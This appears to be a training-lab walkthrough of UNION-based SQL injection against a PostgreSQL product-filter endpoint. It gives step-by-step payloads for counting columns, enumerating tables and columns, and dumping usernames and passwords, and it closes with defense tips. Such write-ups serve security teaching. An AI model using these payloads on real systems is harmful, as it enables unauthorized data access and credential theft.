# 🛠️ SQL Injection Walkthrough: UNION-Based Data Extraction  
## 🔍 Step-by-Step Guide to Exploiting a PostgreSQL Backend  

## 🎯 Objective

**To exploit a SQL injection vulnerability in a web application using `UNION SELECT` queries and extract sensitive data (`username`, `password`) from the backend database — even when only one column is visible.**

## 🧪 Lab Overview

You're targeting a vulnerable web app that filters products by category via a URL parameter:

```
GET /filter?category=<INJECT_HERE>
```

The backend uses **PostgreSQL**, and you've determined that:
- Only **2 columns** are returned by the original query.
- Only the **second column** is visible in the output.

This walkthrough will guide you through the full process of identifying, exploiting, and extracting data using **UNION-based SQL injection**.

## 🧭 Step-by-Step Walkthrough

### 🔹 Step 1: Confirm SQL Injection Vulnerability

Start by checking if the input is vulnerable to SQL injection.

```http
GET /filter?category='
```

If this breaks the query or shows an error → ✅ The input is injectable.

### 🔹 Step 2: Determine Number of Columns Returned

Try injecting a `UNION SELECT` with increasing numbers of `NULL`s to find how many columns the query returns.

#### ❌ Try 1 Column:
```http
GET /filter?category='+UNION+SELECT+NULL-- 
```

❌ Fails → Query expects more than 1 column.

#### ✅ Try 2 Columns:
```http
GET /filter?category='+UNION+SELECT+NULL,NULL-- 
```

✅ Works → Confirms there are **2 columns** in the original query.

#### ❌ Try 3 Columns:
```http
GET /filter?category='+UNION+SELECT+NULL,NULL,NULL-- 
```

❌ Fails → Confirms only **2 columns exist**.

> 📝 **Why This Works**:  
> The `UNION SELECT` operator requires both queries to return the same number of columns. If it fails when we use 3 `NULL`s, it means the original query has only 2 columns.

### 🔹 Step 3: Find Which Column Is Visible

Now test which of the two columns is actually displayed in the application.

#### ❌ First Column Test:
```http
GET /filter?category='+UNION+SELECT+'a',NULL-- 
```

❌ Doesn't show `'a'` → First column not visible.

#### ✅ Second Column Test:
```http
GET /filter?category='+UNION+SELECT+NULL,'a'-- 
```

✅ Shows `'a'` → **Second column is visible**.

> 📝 **Why This Matters**:  
> You can only see results from the second column, so all useful data must be placed there.

### 🔹 Step 4: List All Tables in the Database

Now that you know the structure, start enumerating tables in the current schema.

```http
GET /filter?category='+UNION+SELECT+NULL,table_name+FROM+information_schema.tables-- 
```

✅ Returns a long list of tables including:
- `users`
- `products`
- `pg_*` internal tables

> 📝 **What's Happening Here**:  
> - `information_schema.tables` is a standard SQL table that lists all tables in the database.
> - By selecting `table_name`, we get a list of all available tables.

### 🔹 Step 5: Extract Column Names for the `users` Table

Once you identify the `users` table, retrieve its column names.

```http
GET /filter?category='+UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name='users'-- 
```

✅ Returns:
- `username`
- `password`
- `email`

> 📝 **Why This Works**:  
> - `information_schema.columns` holds metadata about table columns.
> - Filtering by `table_name='users'` gives us the exact fields in the `users` table.

### 🔹 Step 6: Craft Query to Combine Multiple Values in One Column

Since only the second column is visible, combine both `username` and `password` into a single string using **string concatenation**.

In PostgreSQL, use the `||` operator.

```http
GET /filter?category=' UNION SELECT NULL, username || '~' || password FROM users-- 
```

✅ Output:
```
administrator~68jy1v6acq9sxdjy14c4
carlos~pvj4s1x0tyzs60vx2aof
wiener~3h9a2z3j0fbh4ysvjp3g
```

> 📝 **How This Works**:
> - `username || '~' || password`: Concatenates two values together with a separator (`~`), making it easy to distinguish them later.
> - Placing this in the second column ensures it’s visible in the output.

## 🧠 Bonus: Get More Info Using Same Technique

Here are other useful payloads you can try:

### 🗂️ Get Current Database Name
```http
GET /filter?category=' UNION SELECT NULL, current_database()-- 
```

### 👤 Get Current User
```http
GET /filter?category=' UNION SELECT NULL, current_user-- 
```

### 📦 Dump Product Info (if `products` table exists)
```http
GET /filter?category=' UNION SELECT NULL, name || ' - $' || price::text FROM products-- 
```

## 📋 Summary of Payloads Used

| Goal | Payload |
|------|---------|
| Confirm injectable | `'` |
| Check column count | `' UNION SELECT NULL,NULL--` |
| Identify visible column | `' UNION SELECT NULL,'a'--` |
| List tables | `' UNION SELECT NULL,table_name FROM information_schema.tables--` |
| Get columns of `users` | `' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--` |
| Extract credentials | `' UNION SELECT NULL, username || '~' || password FROM users--` |

## 🛡️ Defense Tips

To prevent SQL injection:

- Use **parameterized queries** or **prepared statements**.
- Validate and sanitize all user inputs.
- Use **Web Application Firewalls (WAFs)** to detect common SQLi patterns.
- Limit database permissions — don’t run queries as admin.
- Monitor logs for suspicious activity.

## 🧩 Final Thoughts

SQL injection is a powerful technique that allows attackers to extract or manipulate data from a database. In this walkthrough, you learned how to:
- Identify the number of columns in a query.
- Discover which column is visible.
- Enumerate tables and their columns.
- Craft custom payloads to extract multiple values in one visible column using concatenation.

With practice, these techniques become second nature — but always remember: **use your powers responsibly!**


Happy hacking! 🔥🕵️‍♂️🛡️
